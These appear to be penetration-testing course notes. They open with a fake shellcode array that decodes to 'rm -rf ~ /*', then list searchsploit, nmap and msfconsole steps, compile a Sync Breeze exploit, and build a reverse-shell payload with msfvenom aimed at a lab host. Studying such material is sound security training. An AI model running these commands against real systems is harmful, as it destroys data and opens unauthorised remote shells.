
```
[...]
char jmpcode[] = "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f" "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]


kali@kali:~$ python
>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f" ... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print jmpcode
['rm -rf ~ /* 2> /dev/null &']
```


```
firefox --search "Microsoft Edge site:exploit-db.com"
```


```
searchsploit remote smb microsoft windows

nmap --script-help=clamav-exec.nse


```


```
sudo msfconsole -q
search ms08-067
search -h
```

```
sudo nmap 10.11.0.128 -p- -sV -vv --open --reason


```


```
searchsploit "Sync Breeze Enterprise 10.0.28"

searchsploit -m 42341

sudo apt install mingw-w64

i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"


```

